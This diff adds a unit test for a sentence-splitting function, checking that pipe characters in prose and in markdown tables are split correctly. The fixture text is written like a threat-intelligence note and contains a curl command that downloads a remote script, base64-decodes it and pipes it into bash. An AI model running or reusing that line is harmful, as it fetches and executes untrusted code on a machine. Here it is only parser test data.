@@ -157,6 +157,30 @@ class TestSplitSentences:
             "Coverage: 2026-01-26 through 2026-07-04. More text.",
         ]
 
+    def test_pipes_in_prose_are_not_table_rows(self) -> None:
+        text = (
+            "The loader ran curl -s http://203.0.113.7/a.sh | base64 -d | bash and\n"
+            "then deleted itself. IOC summary: ALPHV | BlackCat | LockBit. The first\n"
+            "two share code.\r\n"
+            "| Actor | CVE |\r\n"
+            "|---|:---:|\r\n"
+            "| ALPHV | CVE-2024-1234 |\r\n"
+            "LockBit | CVE-2023-4966 | still tracked. Another row\r\n"
+            "\r\n"
+            "After the table. Done."
+        )
+        assert split_sentences(text) == [
+            "The loader ran curl -s http://203.0.113.7/a.sh | base64 -d | bash and then "
+            "deleted itself.",
+            "IOC summary: ALPHV | BlackCat | LockBit.",
+            "The first two share code.",
+            "Actor | CVE",
+            "ALPHV | CVE-2024-1234",
+            "LockBit | CVE-2023-4966 | still tracked. Another row",
+            "After the table.",
+            "Done.",
+        ]
+
     def test_headings_lists_and_quotes_start_new_units(self) -> None:
         text = (
             "### Insight 47\n"
